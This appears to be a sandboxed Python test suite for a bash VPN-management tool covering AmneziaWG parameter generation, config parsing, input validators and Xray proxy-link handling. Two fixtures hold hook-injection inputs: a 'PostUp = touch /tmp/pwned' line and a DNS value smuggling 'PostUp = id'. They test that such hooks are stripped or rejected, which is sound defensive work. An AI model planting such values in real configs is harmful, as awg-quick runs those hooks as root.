"""
test_toolza.py — проверка собранного awg2 (dist/awg2.sh) без root и без сети.

Функции берутся из самого собранного файла (песочница — sandbox.py): он
подключается в bash как библиотека, пути состояния переводятся во временный
каталог, а системные команды (ip, iptables, systemctl, awg...) подменены
заглушками, которые пишут вызовы в журнал.

Что проверяется:
  • генератор параметров AWG 2.0 / 3.0 / 3.1 — инварианты длин, H1-H4,
    таймеры 3.x;
  • чтение конфигов прежних версий (метки, версия по ключам, подсеть);
  • встроенный helper.py — клиенты, сроки, замена параметров, Xray, exit-ноды;
  • служебные скрипты (emit_script) — синтаксис и запуск: нет «command not
    found», правила iptables ставятся с нужными метками;
  • разбор iptables-save с комментарием в кавычках;
  • машинный API (awg2 api): ответы, очередь, задачи.

Запуск:  python3 tests/test_toolza.py [путь/к/dist/awg2.sh]
Выход:   0 — всё прошло, 1 — есть провалы.
"""
import base64
import hashlib
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from sandbox import *  # noqa: E402,F401,F403

# ── 1. Генератор параметров ───────────────────────────────
print("Параметры AWG")
N = 120
for proto in ("2.0", "3.0", "3.1"):
    for profile in ("lite", "standard", "pro"):
        rc, out, err = bash(f'MTU=1280; AUTO_MODE=1; for i in $(seq {N}); do gen_awg_params {profile} {proto} || exit 1; echo "$AWG_PARAMS"; echo ---; done')
        sets = [kv(b) for b in out.split("---") if b.strip()]
        label = f"{proto}/{profile}"
        chk(f"{label}: сгенерировано {N}", rc == 0 and len(sets) == N, err[-300:])
        bad = []
        for p in sets:
            S = [int(p[f"S{i}"]) for i in range(1, 5)]
            jc, jmin, jmax = int(p["Jc"]), int(p["Jmin"]), int(p["Jmax"])
            if not (1 <= jc <= 128 and jmin < jmax):
                bad.append(("J", p))
            if S[3] > 32:
                bad.append(("S4>32", p))
            if abs(S[0] + 56 - S[1]) < 10 or abs(S[0] + 84 - S[2]) < 10 or abs(S[1] + 28 - S[2]) < 10:
                bad.append(("S-коллизия", S))
            H = [p[f"H{i}"] for i in range(1, 5)]
            if proto.startswith("3"):
                if min(S) < 12:
                    bad.append(("S<12", S))
                if H != ["1", "2", "3", "4"]:
                    bad.append(("H", H))
                rat = [int(x) for x in p["RekeyAfterTime"].split("-")]
                rjt = [int(x) for x in p["RejectAfterTime"].split("-")]
                if not (rat[0] < rat[1] < rjt[0] < rjt[1]):
                    bad.append(("таймеры", rat, rjt))
                if ("RandomTrailers" in p) != (proto == "3.1") or ("DisableCookies" in p) != (proto == "3.1"):
                    bad.append(("3.1-ключи", sorted(p)))
                if "HeaderProtectionKey" not in p:
                    bad.append(("HPK", sorted(p)))
            else:
                rng = [tuple(int(x) for x in h.split("-")) for h in H]
                flat = [x for r in rng for x in r]
                if flat != sorted(flat) or flat[-1] > 2**31 - 1 or any(b - a < 1000 for a, b in rng):
                    bad.append(("H-диапазоны", H))
                if any(k in p for k in ("HeaderProtectionKey", "RandomTrailers")):
                    bad.append(("3.x-ключи в 2.0", sorted(p)))
        chk(f"{label}: инварианты", not bad, str(bad[:3]))

rc, out, _ = bash('MTU=1420; AUTO_MODE=1; gen_awg_params pro 3.1 >/dev/null; echo "$MTU"')
chk("MTU 1420 на 3.1 снижается до запаса", rc == 0 and int(out.split()[-1]) < 1420, out)

# ── 2. Конфиги прежних версий ─────────────────────────────
print("Конфиги")
os.makedirs(os.path.join(ROOT, "etc/amnezia/amneziawg"), exist_ok=True)
conf = os.path.join(ROOT, "etc/amnezia/amneziawg/awg0.conf")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('echo "$(server_proto)|$(server_net)|$(server_port)|$(server_region)|$(server_profile)|$(client_suffix)"')
chk("2.0 без метки AWG_PROTO", out.strip() == "2.0|10.23.45.0/24|51820|ru|pro|_awg2", out)
rc, out, _ = bash("clients_tsv")
rows = [r.split("\t") for r in out.strip().splitlines()]
chk("клиенты и метки", [r[0] for r in rows] == ["alice", "bob"] and rows[1][3] == "1", out)
rc, out, _ = bash('conf_marker_set AWG_PROTO 3.1; conf_marker AWG_PROTO; sed -n "1,/^\\[Interface\\]/p" "$SERVER_CONF"')
chk("метка вставляется в шапку", out.splitlines()[0] == "3.1" and "# AWG_PROTO=3.1" in out, out)
# Конфиг без шапки (начинается с [Interface]): «1a» ставила метку внутрь секции, где её не видно
with open(conf, "w") as f:
    f.write(OLD20[OLD20.index("[Interface]"):])
rc, out, _ = bash('conf_marker_set AWG_ENDPOINT vpn.example.com; conf_marker AWG_ENDPOINT; head -1 "$SERVER_CONF"')
chk("метка перед [Interface], когда шапки нет", out.splitlines() == ["vpn.example.com", "# AWG_ENDPOINT=vpn.example.com"], out)
with open(conf, "w") as f:
    f.write(OLD20)
with open(conf, "w") as f:
    f.write(OLD20.replace("H4 = 1610612736-1610620000", "H4 = 4\nHeaderProtectionKey = K=\nRandomTrailers = on"))
rc, out, _ = bash("server_proto")
chk("3.1 по ключам без метки", out.strip() == "3.1", out)

# ── 3. helper.py ──────────────────────────────────────────
print("helper.py")
with open(conf, "w") as f:
    f.write(OLD20)
rc, out, _ = bash('py expire-check "$SERVER_CONF" 127.0.0.2/32 "$EXPIRE_STATE_DIR"; py peers "$SERVER_CONF"')
chk("истёкший клиент блокируется", "EXPIRED\tbob\t10.23.45.3/32" in out and "127.0.0.2/32\t1\t10.23.45.3/32" in out, out)
rc, out, _ = bash('py expire-clear "$SERVER_CONF" bob 127.0.0.2/32; py peers "$SERVER_CONF" | grep bob')
chk("разблокировка возвращает адрес", "10.23.45.3/32\t\t\t" in out, repr(out))
rc, out, _ = bash('py peer-del "$SERVER_CONF" PUBALICE=; grep -c "^\\[Peer\\]" "$SERVER_CONF"')
chk("удаление пира", out.split() == ["alice", "1"], out)
rc, out, _ = bash('printf "Jc = 7\\nS1 = 33\\nH1 = 1\\nHeaderProtectionKey = NEW=\\n" | py params-replace "$SERVER_CONF"; '
                  'sed -n "/^\\[Peer\\]/q;p" "$SERVER_CONF"')
p = kv(out)
chk("замена параметров", p.get("Jc") == "7" and p.get("S1") == "33" and p.get("HeaderProtectionKey") == "NEW="
    and "S2" not in p and p.get("PrivateKey") == "sPRIV=" and p.get("Address") == "10.23.45.1/24", out)

with open(os.path.join(ROOT, "bot.conf"), "w") as f:
    f.write('BOT_TOKEN="1:AA"\nADMIN_ID=11, 22\nBOT_PROXY=socks5://127.0.0.1:1080\n')
with open(os.path.join(ROOT, "admins.json"), "w") as f:
    json.dump({"version": 1, "admins": {"33": {}, "22": {}}, "invites": {}}, f)
rc, out, _ = bash('py tg-targets "$BOT_CONF" "$BOT_ADMINS"')
chk("уведомления: владельцы, приглашённые, прокси", out.split("\n")[:5] == ["1:AA", "socks5://127.0.0.1:1080", "11", "22", "33"], out)
os.remove(os.path.join(ROOT, "bot.conf"))

EXIT = os.path.join(TMP, "exit.conf")
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nDNS = 1.1.1.1\nTable = auto\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: Table = off, без DNS", "Table = off" in out and "DNS" not in out and "Table = auto" not in out, out)
# Хуки awg-quick выполняются bash от root — из чужого конфига (вставка, бот, бэкап) их быть не должно
with open(EXIT, "w") as f:
    f.write("[Interface]\nPrivateKey = X\nAddress = 10.9.0.2/32\nPostUp = touch /tmp/pwned\nPreDown = true\n"
            "SaveConfig = true\n\n[Peer]\nEndpoint = 1.2.3.4:51820\nAllowedIPs = 0.0.0.0/0\n")
rc, out, _ = bash(f'py exit-conf-fix "{EXIT}"; cat "{EXIT}"')
chk("exit-нода: PostUp/PreDown/SaveConfig выброшены", "PostUp" not in out and "PreDown" not in out
    and "SaveConfig" not in out and "Table = off" in out and "Endpoint = 1.2.3.4:51820" in out, out)

# Пиры в записи wireguard-tools: «[Peer] # имя», «[peer]» с отступом, комментарий после значения
LOOSE = os.path.join(TMP, "loose.conf")
with open(LOOSE, "w") as f:
    f.write("[Interface]\nPrivateKey = P\nAddress = 10.5.0.1/24\n\n[Peer] # carol\nPublicKey = PC= # note\n"
            "AllowedIPs = 10.5.0.2/32\n\n  [peer]\n# dave\nPublicKey=PD=\nAllowedIPs = 10.5.0.3/32\n")
rc, out, _ = bash(f'py peers "{LOOSE}"')
rows = [r.split("\t") for r in out.strip("\n").split("\n")]
chk("пиры в вольной записи видны, имя — и из заголовка", [r[1] for r in rows] == ["PC=", "PD="]
    and rows[0][2] == "10.5.0.2/32" and [r[0] for r in rows] == ["carol", "dave"], out)
# Таб для read — пробельный разделитель: пустые колонки TSV схлопывались, и пир без имени
# получал в имя ключ, а клиент со сроком — чужое orig_ips (показывался заблокированным)
rc, out, _ = bash(f'SERVER_CONF="{LOOSE}"; clients_name_ip')
chk("clients_name_ip: колонки не съезжают", out.split() == ["carol|10.5.0.2", "dave|10.5.0.3"], out)
TSV = os.path.join(TMP, "peers.tsv")
with open(TSV, "w") as f:
    f.write("alice\tPUBA=\t10.8.0.2/32\t1800000000\t\tnone\n")
rc, out, _ = bash(f'clients_tsv() {{ cat "{TSV}"; }}; clients_psv | {{ IFS="|" read -r name pub aip exp orig rest; echo "$exp|$orig|$rest"; }}')
chk("clients_psv: пустая колонка остаётся пустой", out.strip() == "1800000000||none", out)

# Модуль ядра: в Ubuntu 7.0.0-38 смена API udp_tunnel перенесена частично —
# вызов выбирается по заголовкам ядра, а не по номеру версии
UDP_OLD = ("#if LINUX_VERSION_CODE < KERNEL_VERSION(7, 1, 5)\n#include <net/udp_tunnel.h>\n"
           "#define setup_udp_tunnel_sock(net, sk, sock_cfg) setup_udp_tunnel_sock(net, sk->sk_socket, sock_cfg)\n"
           "#define udp_tunnel_sock_release(sk) udp_tunnel_sock_release(sk->sk_socket)\n#endif\n")
KM = os.path.join(TMP, "kmod", "src")
os.makedirs(os.path.join(KM, "compat"))
with open(os.path.join(KM, "compat/compat.h"), "w") as f:
    f.write("#ifndef _WG_COMPAT_H\n" + UDP_OLD + "#endif\n")
with open(os.path.join(KM, "compat/Kbuild.include"), "w") as f:
    f.write("ccflags-y += -DBASE\n")
rc, out, _ = bash(f'py mod-compat-patch "{KM}"; py mod-compat-patch "{KM}"; py mod-compat-patch "{TMP}"')
with open(os.path.join(KM, "compat/compat.h")) as f:
    comp = f.read()
chk("исходник модуля: правка udp_tunnel один раз, без нужного места — не трогается",
    out.split() == ["patched", "already", "skip"] and "#ifndef COMPAT_UDP_TUNNEL_SETUP_SK" in comp
    and "#ifndef COMPAT_UDP_TUNNEL_RELEASE_SK" in comp and comp.count("setup_udp_tunnel_sock(net, sk->sk_socket") == 1, out + comp)
KT = os.path.join(TMP, "ktree", "include", "net")
os.makedirs(KT)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # как в Ubuntu 7.0.0-38
    f.write("void setup_udp_tunnel_sock(struct net *net, struct sock *sk,\n\t\t\t   struct udp_tunnel_sock_cfg *sock_cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
MK = os.path.join(TMP, "kmod", "probe.mk")
with open(MK, "w") as f:
    f.write(f"include {KM}/compat/Kbuild.include\nall:\n\t@echo $(ccflags-y)\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: make разбирает проверку, флаг — только у перенесённого вызова",
    r.returncode == 0 and r.stdout.split() == ["-DBASE", "-DCOMPAT_UDP_TUNNEL_SETUP_SK"], r.stdout + r.stderr)
with open(os.path.join(KT, "udp_tunnel.h"), "w") as f:      # прежний API (6.8, 7.0.0-34)
    f.write("void setup_udp_tunnel_sock(struct net *net, struct socket *sock,\n\t\t\t   struct udp_tunnel_sock_cfg *cfg);\n"
            "void udp_tunnel_sock_release(struct socket *sock);\n")
r = subprocess.run(["make", "-s", "-f", MK, "srctree=" + os.path.join(TMP, "ktree")], capture_output=True, text=True)
chk("Kbuild.include: прежний API — флагов нет, модуль собирается как раньше",
    r.returncode == 0 and r.stdout.split() == ["-DBASE"], r.stdout + r.stderr)

# «√ ОС:» в установке: OS_LABEL, найденный внутри $(os_supported), в оболочку не возвращается
rc, out, _ = bash('OS_ID=""; why=$(os_supported); echo "до=[$OS_LABEL]"; OS_ID=""; os_detect; echo "после=[$OS_LABEL]"')
chk("название ОС для «√ ОС:» — после os_detect, не из подоболочки",
    "до=[]" in out and re.search(r"после=\[\S.+\]", out), out)
rc, out, _ = bash("declare -f do_install | sed -n '1,12p'")
chk("do_install определяет ОС до проверки", out.find("os_detect") != -1 and out.find("os_detect") < out.find("os_supported"), out)

# Мастер создания сервера: регион — выбором 1/2, Enter и Ctrl+D — Европа / мир
picked = [bash('_choose_region; echo "R=$S_REGION"', stdin=s)[1].strip().splitlines()[-1] for s in ("2\n", "\n", "")]
chk("регион сервера: 2 — Россия, Enter и Ctrl+D — мир", picked == ["R=ru", "R=world", "R=world"], picked)
rc, out, _ = bash('S_NET=""; _choose_net; echo "N=$S_NET"', stdin="2\n\n")
chk("подсеть вручную: пустой ввод — случайная, мастер не обрывается",
    rc == 0 and re.search(r"N=10\.\d+\.\d+\.0/24$", out.strip()), out)

# Валидаторы: ведущие нули — отказ, а не восьмеричное число или ошибка арифметики
rc, out, err = bash('valid_port 0080 || echo a; valid_port 65536 || echo b; valid_port 0 || echo c; '
                    'valid_cidr 10.0.0.0/08 || echo d; valid_cidr 10.0.0.0/33 || echo e; '
                    'valid_port 80 && valid_port 65535 && valid_cidr 10.0.0.0/0 && valid_cidr 10.8.0.0/24 && echo f')
chk("valid_port/valid_cidr: ведущие нули — отказ без ошибки bash", out.split() == ["a", "b", "c", "d", "e", "f"]
    and "too great" not in err and "syntax error" not in err, out + err)
# Октеты IP без ведущих нулей: «010.0.0.1» iptables отвергает, а ip_is_private
# счёл бы его публичным
rc, out, err = bash('valid_ip 010.0.0.1 || echo a; valid_ip 1.2.3.04 || echo b; valid_ip 256.1.1.1 || echo c; '
                    'valid_ip 0.0.0.0 && valid_ip 10.0.0.1 && valid_ip 255.255.255.255 && echo d; '
                    'valid_cidr 010.8.0.0/24 || echo e')
chk("valid_ip: октеты с ведущими нулями — отказ", out.split() == ["a", "b", "c", "d", "e"] and not err, out + err)
rc, out, err = bash('for d in "1.1.1.1, 1.0.0.1" "8.8.8.8" "1.1.1.1 8.8.8.8" "999.999.999.999, 8.8.8.8" "1.1.1" "" ", "; do '
                    'valid_dns_list "$d" && echo y || echo n; done')
chk("DNS клиентов: каждый адрес — настоящий IPv4 (999.999.999.999 — отказ)",
    out.split() == ["y", "y", "y", "n", "n", "n", "n"] and not err, out + err)
rc, out, err = bash('valid_dns_list $\'1.1.1.1\\nPostUp = id\' && echo y || echo n; '
                    'valid_dns_list $\'1.1.1.1\\t8.8.8.8\' && echo y || echo n')
chk("DNS клиентов: одна строка — перевод строки (и табуляция) не проходят", out.split() == ["n", "n"] and not err,
    out + err)
rc, out, _ = bash('for d in 010.0.0.1 1.2.3.04 1.2.3.4 example.com; do valid_domain "$d" && echo "$d"; done')
chk("valid_domain: цифры с точками (и с нулями) — не домен", out.split() == ["example.com"], out)

WG = os.path.join(ROOT, "etc/wireguard/wgobf0.conf")
os.makedirs(os.path.dirname(WG), exist_ok=True)
with open(WG, "w") as f:
    f.write("[Interface]\nPrivateKey = S\nListenPort = 5\n\n[Peer]\n# client=a\nPublicKey = A\nAllowedIPs = 10.77.1.2/32\n\n"
            "[Peer]\n# client=b\nPublicKey = B\nAllowedIPs = 10.77.1.3/32\n\n"
            "[Peer]\n# client=c\nPublicKey = C\nAllowedIPs = 10.77.1.4/32\n")
rc, out, _ = bash("wgobf_delete_client b >/dev/null && wgobf_clients")
with open(WG) as f:
    wg = f.read()
chk("WG + обфускатор: удаляется ровно свой [Peer]", out.split() == ["a", "c"] and "PublicKey = B" not in wg
    and "PublicKey = A" in wg and "PublicKey = C" in wg and wg.startswith("[Interface]\nPrivateKey = S"), wg)

rc, out, _ = bash('printf "10.10.0.0/16\\n10.20.1.1/24\\n" | py pick-net awg')
net = out.strip()
chk("свободная подсеть", re.match(r"^10\.\d+\.\d+\.0/24$", net) and not net.startswith("10.10.")
    and not net.startswith("10.20.1."), net)
rc, out, _ = bash("py allowed-except 1.2.3.4")
chk("AllowedIPs без адреса сервера", "1.2.3.4/32" not in out and "1.2.3.5/32" in out and out.strip().endswith("::/0"), out[:120])

VLESS = ("vless://11111111-2222-3333-4444-555555555555@ex.example.com:443?type=xhttp&security=reality"
         "&pbk=PBK&sid=ab&sni=www.site.com&fp=chrome&path=%2Fp&mode=auto&flow=#test")
rc, out, _ = bash(f"py xray-link '{VLESS}'")
ob = json.loads(out) if rc == 0 else {}
ss = ob.get("streamSettings", {})
chk("vless reality + xhttp", ob.get("protocol") == "vless" and ss.get("network") == "xhttp"
    and ss.get("realitySettings", {}).get("publicKey") == "PBK" and ss.get("xhttpSettings", {}).get("path") == "/p", out)
XC = os.path.join(TMP, "xray.json")
rc, out, err = bash(f'''py xray-default "{XC}"
py xray-link '{VLESS}' | py xray-add "{XC}"
py xray-link '{VLESS.replace("ex.example.com", "two.example.com")}' | py xray-add "{XC}"
py xray-prepare "{XC}" tun2socks
py xray-balancer "{XC}" leastPing
py xray-ru "{XC}" on
cat "{XC}"''')
xc = json.loads(out) if rc == 0 else {}
rules = xc.get("routing", {}).get("rules", [])
chk("Xray: два выхода, балансировщик, РФ напрямую",
    len([o for o in xc.get("outbounds", []) if o["protocol"] == "vless"]) == 2
    and xc["routing"]["balancers"][0]["strategy"]["type"] == "leastPing"
    and sum(1 for r in rules if r.get("ruleTag") == "ru-direct") == 2
    and rules[-1].get("balancerTag") == "balancer"
    and all(i.get("protocol") != "tun" for i in xc["inbounds"]), err or out[:300])
rc, out, _ = bash(f'py xray-del "{XC}" proxy_two_example_com; py xray-prepare "{XC}" native; cat "{XC}"')
xc = json.loads(out)
chk("Xray: удаление выхода чинит балансировщик", not xc["routing"].get("balancers")
    and any(i.get("protocol") == "tun" for i in xc["inbounds"])
    and all(r.get("outboundTag") != "proxy_two_example_com" for r in xc["routing"]["rules"]), out[:300])

# ── Xray: пробы на бинаре ─────────────────────────────────
# Заглушка ведёт себя как Xray 26.x: формат конфига — по расширению, без
# «.json» отказ; protocol hysteria2 (старое имя) и allowInsecure не знает,
# hysteria версии 2 и inbound tun умеет. XRAY_STUB_OLD=1 — сборка без hysteria.
XRAY_STUB = os.path.join(TMP, "xray-stub")
with open(XRAY_STUB, "w") as f:
    f.write(r"""#!/usr/bin/env bash
[[ "$1" == version ]] && { echo "Xray 26.3.27 (Xray, Penetrates Everything.)"; exit 0; }
f=""; while (( $# )); do [[ "$1" == -c ]] && { f="$2"; shift; }; shift; done
[[ "$f" == *.json ]] || { echo "Failed to start: main: failed to load config files: [$f] > core: Failed to get format of $f"; exit 23; }
python3 -c 'import json, os, sys
c = json.load(open(sys.argv[1]))
if any(o.get("protocol") == "hysteria2" for o in c.get("outbounds", [])):
    print("infra/conf: unknown config id: hysteria2"); sys.exit(23)
if os.environ.get("XRAY_STUB_OLD") and any(o.get("protocol") == "hysteria" for o in c.get("outbounds", [])):
    print("infra/conf: unknown config id: hysteria"); sys.exit(23)
if "allowInsecure" in json.dumps(c):
    print("The feature allowInsecure has been removed"); sys.exit(23)
# Проверка с inbound tun создаёт устройство: занятое имя — отказ, как у Xray
busy = open(os.environ["LINKS"]).read().split()
for ib in c.get("inbounds", []):
    if ib.get("protocol") == "tun" and (ib.get("settings") or {}).get("name", "xray0") in busy:
        print("Failed to start: main: failed to create server > device or resource busy"); sys.exit(23)' "$f" || exit 23
""")
os.chmod(XRAY_STUB, 0o755)
XRAY_ENV = (f'XRAY_BIN="{XRAY_STUB}"; XRAY_DIR="{ROOT}/etc/xray"; XRAY_CONF="$XRAY_DIR/config.json"; '
            'mkdir -p "$XRAY_DIR"; [[ -f "$XRAY_CONF" ]] || py xray-default "$XRAY_CONF"; ')
VLESS_TCP = ("vless://0378c8eb-6544-478e-837d-c3599ef8e73d@dash.example.site:8443?alpn=h2%2Chttp%2F1.1"
             "&encryption=none&flow=xtls-rprx-vision&fp=chrome&security=tls&sni=dash.example.site&type=tcp#NL_Vless")
rc, out, _ = bash(XRAY_ENV + f"xray_add_link '{VLESS_TCP}' && xray_tags")
chk("Xray: vless-ссылка добавляется (проба в .json)", rc == 0 and "proxy_dash_example_site" in out, out)
rc, out, _ = bash(XRAY_ENV + "xray_tun_supported && echo tun-yes; xray_bad_outbounds | sed 's/^/BAD:/'")
chk("Xray: inbound tun определяется, годный выход не считается плохим", "tun-yes" in out and "BAD:" not in out, out)
with open(LINKS, "w") as f:
    f.write("xray0\n")
rc, out, _ = bash(XRAY_ENV + 'py xray-prepare "$XRAY_CONF" native; xray_test && echo TEST-OK; '
                  '_XRAY_TUN=""; xray_tun_supported && echo TUN-YES')
open(LINKS, "w").close()
chk("Xray работает (xray0 занят): проверка конфига и проба tun не упираются в busy",
    "TEST-OK" in out and "TUN-YES" in out, out)
rc, out, _ = bash("XRAY_STUB_OLD=1; export XRAY_STUB_OLD; " + XRAY_ENV
                  + "xray_add_link 'hysteria2://secret@h2.example.site:443?sni=h2.example.site#H2'")
chk("Xray без Hysteria2: выход отклонён с подсказкой обновить Xray", rc != 0 and "обнови Xray" in out, out)
H2 = ("hysteria2://h2testpass0001@h2.example.site:443?alpn=h3&ech=AGb%2BDQBi&fp=chrome"
      f"&pinSHA256={'aa' * 32}%2C{'bb' * 32}&security=tls&sni=h2.example.site#H2-Ha2pa")
rc, out, _ = bash(XRAY_ENV + f"xray_add_link '{H2}' && cat \"$XRAY_CONF\"")
xc = json.loads(out[out.index("{"):]) if rc == 0 and "{" in out else {}
h2 = next((o for o in xc.get("outbounds", []) if o.get("tag") == "proxy_h2_example_site"), {})
st = h2.get("streamSettings") or {}
chk("Hysteria2 — в формате Xray 26: hysteria v2, пароль, SNI, h3, ECH, pinSHA256",
    h2.get("protocol") == "hysteria" and h2["settings"] == {"version": 2, "address": "h2.example.site", "port": 443}
    and st.get("network") == "hysteria" and st["hysteriaSettings"] == {"version": 2, "auth": "h2testpass0001"}
    and st["tlsSettings"]["serverName"] == "h2.example.site" and st["tlsSettings"]["alpn"] == ["h3"]
    and st["tlsSettings"]["echConfigList"] == "AGb+DQBi" and st["tlsSettings"]["pinnedPeerCertSha256"].count(",") == 1,
    [rc, out[-600:]])
bash(XRAY_ENV + "xray_del_tag proxy_h2_example_site >/dev/null")
rc, out, _ = bash(XRAY_ENV + "xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'"
                  " >/dev/null; xray_add_link 'vless://11111111-2222-3333-4444-555555555555@x.example.site:443?security=tls&type=tcp#dup'")
chk("Xray: подсказка про Hysteria2 только для неё", "Hysteria2" not in out, out)
LINKS_OK = {
    "trojan": "trojan://tpass@t.example.com:443?security=tls&sni=t.example.com&type=ws&path=%2Fws&host=t.example.com#tr",
    "ss SIP002": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:8388#ss1",
    "ss 2022": "ss://2022-blake3-aes-128-gcm:AAAAAAAAAAAAAAAAAAAAAA%3D%3D@ss.example.com:443#ss2022",
    "ss старый": "ss://Y2hhY2hhMjAtaWV0Zi1wb2x5MTMwNTpwd0A1LjYuNy44OjkwMDA=#legacy",
}
want = {"trojan": ("trojan", "t.example.com", 443, "tpass"), "ss SIP002": ("shadowsocks", "1.2.3.4", 8388, "pass123"),
        "ss 2022": ("shadowsocks", "ss.example.com", 443, "AAAAAAAAAAAAAAAAAAAAAA=="),
        "ss старый": ("shadowsocks", "5.6.7.8", 9000, "pw")}
for k, link in LINKS_OK.items():
    rc, out, _ = bash(f"py xray-link '{link}'")
    ob = json.loads(out) if rc == 0 else {}
    srv = ((ob.get("settings") or {}).get("servers") or [{}])[0]
    chk(f"ссылка {k} разбирается", (ob.get("protocol"), srv.get("address"), srv.get("port"), srv.get("password")) == want[k], out)
rc, out, err = bash("py xray-link 'vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:443?security=tls&type=tcp&allowInsecure=1#v'")
chk("allowInsecure не попадает в конфиг (Xray 26 его отвергает), с пояснением",
    rc == 0 and "allowInsecure" not in out and "pinSHA256" in err, [out, err])
rc, out, _ = bash("py xray-link 'trojan://p:a@t.example.com:443?security=tls#t'")
chk("trojan: пароль с двоеточием целиком", rc == 0 and json.loads(out)["settings"]["servers"][0]["password"] == "p:a", out)
for k, link in {"vless :0": "vless://0378c8eb-6544-478e-837d-c3599ef8e73d@v.example.site:0?security=tls",
                "hy2 :0": "hy2://pw@h.example.com:0", "ss :99999": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:99999",
                "ss не-ASCII порт": "ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:\u0664\u0664\u0663",
                "vmess порт abc": "vmess://" + base64.b64encode(b'{"add":"v.example.com","port":"abc","id":"x"}').decode(),
                "hy2 salamander без пароля": "hy2://pw@h.example.com:443?obfs=salamander"}.items():
    rc, out, err = bash(f"py xray-link '{link}'")
    chk(f"ссылка {k} — отказ без трассировки", rc != 0 and "Traceback" not in err and not out.strip(), [out, err])
rc, out, _ = bash("py xray-link 'ss://YWVzLTI1Ni1nY206cGFzczEyMw@1.2.3.4:000443'; py xray-link 'vmess://" +
                  base64.b64encode(b'{"add":"v.example.com","port":443.0,"id":"x"}').decode() + "'")
ports = [json.loads(ln).get("settings", {}) for ln in out.strip().splitlines() if ln.startswith("{")]
chk("порт с ведущими нулями и vmess-порт 443.0 — принимаются как 443",
    rc == 0 and [p.get("servers", p.get("vnext", [{}]))[0].get("port") for p in ports] == [443, 443], out)
rc, out, err = bash("py xray-link 'hy2://pw@h.example.com:443?obfs=salamander&obfs-password=s3#x'")
chk("Hysteria2 с salamander — finalmask", rc == 0 and json.loads(out)["streamSettings"]["finalmask"]
    == {"udp": [{"type": "salamander", "settings": {"password": "s3"}}]}, [out, err])

# ── Xray: свой выход клиенту ──
XP = os.path.join(ROOT, "xray.peers")
rc, out, _ = bash(XRAY_ENV + "xray_tags")
XT = out.split()
rc, out, _ = bash('client_create xc1 "" none "1.1.1.1, 1.0.0.1" "" >/dev/null 2>&1; clients_name_ip')
CN = [line.split("|") for line in out.split()]
chk("Xray: для выбора по клиентам — два клиента", len(CN) >= 2, out)
(C1, IP1), (C2, IP2) = CN[0], CN[1]
chk("Xray: для выбора по клиентам — два выхода", len(XT) >= 2, XT)
rc, out, _ = bash(XRAY_ENV + f"xray_client_out {C1} {XT[1]} && cat \"$XRAY_PEERS\"")
chk("свой выход клиенту — строка «IP|выход», остальные на выходе по умолчанию",
    rc == 0 and f"{IP1}|{XT[1]}" in out.split() and IP2 in out.split(), out)
rc, out, _ = bash(XRAY_ENV + '_xray_prepare; python3 -c "import json,sys; print(json.dumps(json.load(open(sys.argv[1]))[\'routing\'][\'rules\']))" "$XRAY_CONF"')
rules = json.loads(out.strip().splitlines()[-1]) if rc == 0 and out.strip() else []
own = [r for r in rules if r.get("ruleTag") == "client-out"]
chk("в конфиге Xray — правило по адресу клиента перед общим",
    own and own[0]["source"] == [IP1] and own[0]["outboundTag"] == XT[1] and own[0]["inboundTag"] == ["tun-in"]
    and rules.index(own[0]) < next(i for i, r in enumerate(rules) if r.get("ruleTag") != "client-out" and r.get("inboundTag")), rules)
rc, out, _ = bash(XRAY_ENV + f"tunnel_client xray all >/dev/null; tunnel_client xray {C1} on >/dev/null; cat \"$XRAY_PEERS\"")
chk("«все клиенты» и включение клиента свой выход не сбрасывают", f"{IP1}|{XT[1]}" in out.split(), out)
rc, out, _ = bash(XRAY_ENV + f"xray_main_set {XT[1]} && py xray-main-get \"$XRAY_CONF\"")
chk("выход по умолчанию", rc == 0 and out.strip().splitlines()[-1] == XT[1], out)
rc, out, _ = bash(XRAY_ENV + f"xray_client_out {C1} nosuch")
chk("неизвестный выход — ошибка", rc != 0 and "Выхода nosuch нет" in out, out)
rc, out, _ = bash(XRAY_ENV + f"XRAY_BIN={fake_xray(tun=False)}; xray_client_out {C2} {XT[0]}")
chk("сборка Xray без inbound tun — свой выход не назначается, с подсказкой", rc != 0 and "обнови xray" in out.lower(), out)
with open(XP) as f:
    xp_saved = f.read()
rc, out, _ = bash(XRAY_ENV + f"xray_del_tag {XT[1]} >/dev/null; cat \"$XRAY_PEERS\"")
chk("удалён выход — его клиенты на выходе по умолчанию", IP1 in out.split() and "|" not in out, out)
with open(XP, "w") as f:
    f.write(xp_saved)
# Свой выход живёт и в конфиге Xray: выкл/вкл клиента без пересборки оставлял
# правило по адресу — клиент шёл через прежний выход, а в списке — «по умолчанию»
rc, out, _ = bash(XRAY_ENV + 'xray_is_up() { true; }; xray_restart() { echo RESTART; }; _tunnel_rules_refresh() { :; }; '
                  f'tunnel_client xray {C1} off; tunnel_client xray {C1} on; cat "$XRAY_PEERS"; '
                  'python3 -c "import json,sys; print(json.dumps(json.load(open(sys.argv[1]))[\'routing\'][\'rules\']))" "$XRAY_CONF"')
rules = json.loads(out.strip().splitlines()[-1]) if out.strip() else []
chk("Xray: выкл/вкл клиента со своим выходом — конфиг пересобран, правило по адресу снято",
    out.count("RESTART") == 1 and IP1 in out.split() and f"{IP1}|" not in out
    and not any(IP1 in (r.get("source") or []) for r in rules), out)
with open(XP, "w") as f:
    f.write("10.0.0.5|t.1\n10.0.0.6|tx1\n10.0.0.7\n10.0.0.8|t2\n")
rc, out, _ = bash(XRAY_ENV + '_xray_peers_untag t.1 t2; cat "$XRAY_PEERS"')
